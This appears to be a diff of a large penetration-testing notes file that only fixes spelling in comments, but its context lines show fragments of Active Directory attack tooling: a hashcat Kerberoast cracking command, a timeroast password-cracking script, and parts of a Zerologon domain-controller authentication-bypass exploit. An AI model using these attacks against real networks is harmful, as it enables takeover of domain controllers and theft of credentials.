@@ -4652,7 +4652,7 @@ hashcat -m 13100 hashes.kerberoast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/h
 ```python
 #!/usr/bin/env python3
 
-"""Perform a simple dictionary attack against the output of timeroast.py. Neccessary because the NTP 'hash' format 
+"""Perform a simple dictionary attack against the output of timeroast.py. necessary because the NTP 'hash' format 
 unfortunately does not fit into Hashcat or John right now.
 
 Not even remotely optimized, but still useful for cracking legacy default passwords (where the password is the computer 
@@ -8824,7 +8824,7 @@ import hmac, hashlib, struct, sys, socket, time
 from binascii import hexlify, unhexlify
 from subprocess import check_call
 
-# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
+# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be necessary on average.
 MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
 
 def fail(msg):
@@ -8881,7 +8881,7 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
 
 
 def perform_attack(dc_handle, dc_ip, target_computer):
-  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
+  # Keep authenticating until successfull. Expected average number of attempts needed: 256.
   print('Performing authentication attempts...')
   rpc_con = None
   for attempt in range(0, MAX_ATTEMPTS):  
